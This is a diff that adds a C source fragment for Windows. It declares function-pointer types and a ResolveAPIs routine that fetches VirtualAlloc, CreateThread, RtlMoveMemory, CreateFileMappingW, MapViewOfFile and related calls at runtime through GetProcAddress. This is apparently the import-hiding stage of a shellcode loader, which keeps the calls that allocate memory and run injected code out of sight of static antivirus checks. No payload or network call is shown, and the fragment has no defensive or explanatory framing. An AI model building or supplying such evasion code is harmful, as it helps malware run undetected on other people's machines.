@@ -1,0 +1,43 @@
+// --- 1. Define Typedefs for all required function pointers here ---
+typedef HMODULE (WINAPI *pGetModuleHandleA)(LPCSTR);
+typedef FARPROC (WINAPI *pGetProcAddress)(HMODULE, LPCSTR);
+typedef LPVOID (WINAPI *pVirtualAlloc)(LPVOID, SIZE_T, DWORD, DWORD);
+typedef HANDLE (WINAPI *pCreateThread)(LPSECURITY_ATTRIBUTES, SIZE_T, LPTHREAD_START_ROUTINE, LPVOID, DWORD, LPDWORD);
+typedef VOID (WINAPI *pRtlMoveMemory)(VOID UNALIGNED *, const VOID UNALIGNED *, SIZE_T);
+typedef DWORD (WINAPI *pWaitForSingleObject)(HANDLE, DWORD);
+typedef BOOL (WINAPI *pCloseHandle)(HANDLE);
+typedef HANDLE (WINAPI *pCreateFileMappingW)(HANDLE, LPSECURITY_ATTRIBUTES, DWORD, DWORD, DWORD, LPCWSTR);
+typedef LPVOID (WINAPI *pMapViewOfFile)(HANDLE, DWORD, DWORD, DWORD, SIZE_T);
+
+// --- 2. Declare global variables to hold the resolved function pointers here ---
+pVirtualAlloc pfnVirtualAlloc;
+pCreateThread pfnCreateThread;
+pRtlMoveMemory pfnRtlMoveMemory;
+pWaitForSingleObject pfnWaitForSingleObject;
+pCloseHandle pfnCloseHandle;
+pCreateFileMappingW pfnCreateFileMappingW;
+pMapViewOfFile pfnMapViewOfFile;
+
+// --- 3. The WinAPI resolver function ---
+void ResolveAPIs() {
+    // We have to resolve GetProcAddress first
+    pGetModuleHandleA pfnGetModuleHandleA = (pGetModuleHandleA)((ULONG_PTR)GetModuleHandleA);
+    pGetProcAddress pfnGetProcAddress = (pGetProcAddress)((ULONG_PTR)GetProcAddress(pfnGetModuleHandleA("kernel32.dll"), "GetProcAddress"));
+    
+    HMODULE hKernel32 = pfnGetModuleHandleA("kernel32.dll");
+    if (hKernel32 == NULL) { return; }
+
+    pfnVirtualAlloc = (pVirtualAlloc)pfnGetProcAddress(hKernel32, "VirtualAlloc");
+    pfnCreateThread = (pCreateThread)pfnGetProcAddress(hKernel32, "CreateThread");
+    pfnWaitForSingleObject = (pWaitForSingleObject)pfnGetProcAddress(hKernel32, "WaitForSingleObject");
+    pfnCloseHandle = (pCloseHandle)pfnGetProcAddress(hKernel32, "CloseHandle");
+    pfnCreateFileMappingW = (pCreateFileMappingW)pfnGetProcAddress(hKernel32, "CreateFileMappingW");
+    pfnMapViewOfFile = (pMapViewOfFile)pfnGetProcAddress(hKernel32, "MapViewOfFile");
+    
+    HMODULE hNtdll = pfnGetModuleHandleA("ntdll.dll");
+    if (hNtdll == NULL) { return; }
+    pfnRtlMoveMemory = (pRtlMoveMemory)pfnGetProcAddress(hNtdll, "RtlMoveMemory");
+
+    DEBUG_PRINT("All API functions resolved dynamically.");
+}
+
